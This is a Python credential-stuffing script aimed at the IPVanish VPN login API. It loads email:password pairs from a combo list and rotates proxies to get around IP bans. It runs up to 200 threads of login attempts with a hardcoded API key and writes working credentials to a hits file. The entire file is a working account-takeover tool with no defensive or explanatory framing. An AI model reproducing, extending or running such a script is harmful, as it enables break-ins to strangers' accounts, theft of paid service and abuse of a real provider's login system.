import time, httpx, threading, itertools

acc = open('./combo.txt', 'r+').read().splitlines()
proxies = itertools.cycle(open('./proxies.txt', 'r+').read().splitlines())

class Check(threading.Thread):
    def __init__(self, email: str, password: str):
        self.email = email
        self.password = password
        threading.Thread.__init__(self)

    def run(self):
        ok = False
        while not ok:
            try:
                r = httpx.post('https://api.ipvanish.com/api/v3/login', json={'username': self.email, 'password': self.password, 'api_key': '185f600f32cee535b0bef41ad77c1acd'}, proxies='http://'+next(proxies))
                resp = r.text

                if 'Your IP' in resp:
                    print('ip banned')
                    return

                if not 'The username or password provided is incorrect' in resp and not 'Too many failed attempts' in resp:
                    with open('./hit.txt', 'a+') as f:
                        f.write(f'{self.email}:{self.password}' + '\n')
                    
                    print(f'[+] {self.email} -> {resp}')
                    ok = True

                else:
                    print(f'[-] {self.email}')
                    ok = True
            except:
                pass

if __name__ == '__main__':
    threads = 200

    for account in acc:
        try:
            combo = account.split(':')
            email = combo[0]
            password = combo[1]

            while threading.activeCount() >= threads:
                time.sleep(1)
                
            Check(email, password).start()
        except:
            pass